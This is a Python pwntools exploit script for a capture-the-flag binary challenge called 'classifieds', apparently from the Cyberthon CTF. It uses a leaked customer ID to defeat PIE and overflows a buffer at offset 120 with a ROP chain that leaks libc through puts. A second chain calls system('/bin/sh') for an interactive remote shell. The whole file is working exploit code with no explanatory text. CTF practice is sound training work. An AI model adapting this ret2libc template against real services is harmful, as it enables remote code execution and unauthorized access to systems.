from pwn import *

HOST = "chals.cyberthon22f.ctf.sg"
PORT = 10301
CHALLENGE = "classifieds"
SERVER_FLAG_DIR = f"./{CHALLENGE}"

elf = context.binary = ELF(f"./{CHALLENGE}")

ADVERTISEMENT_PROMPT = b"Enter advertisement => "

CUSTOMER_ID_MARKER = b"CUSTOMER#"
PUBLISHED_MARKER = b"published after 3 working days!\n"

RIP_OFFSET = 120


if args.REMOTE:
    io = remote(HOST, PORT)
    libc = ELF("/home/absurdtiger/tools/libc6_2.33-0ubuntu5_amd64.so")
else:
    io = elf.process()
    libc = elf.libc

def leak_address() -> int:
    return u64(io.recvline().rstrip().ljust(8, b'\x00'))

io.recvuntil(CUSTOMER_ID_MARKER)

elf_customer_id = int(io.recvline(keepends=False))

elf.address = elf_customer_id - elf.sym.CUSTOMER_ID
log.success(f"pie @ {hex(elf.address)}")
rop = ROP(elf)
rop.puts(elf.got.puts)
rop.main()

io.sendlineafter(ADVERTISEMENT_PROMPT, flat({RIP_OFFSET: rop.chain()}))

io.recvuntil(PUBLISHED_MARKER)

libc_puts = leak_address()
libc.address = libc_puts - libc.sym.puts

log.success(f"libc @ {hex(libc.address)}")

rop1 = ROP([libc, elf])
rop1.raw(rop1.ret[0])
rop1.system(next(libc.search(b'/bin/sh')))

io.sendlineafter(ADVERTISEMENT_PROMPT, flat({RIP_OFFSET: rop1.chain()}))

io.recvuntil(PUBLISHED_MARKER)

io.interactive()
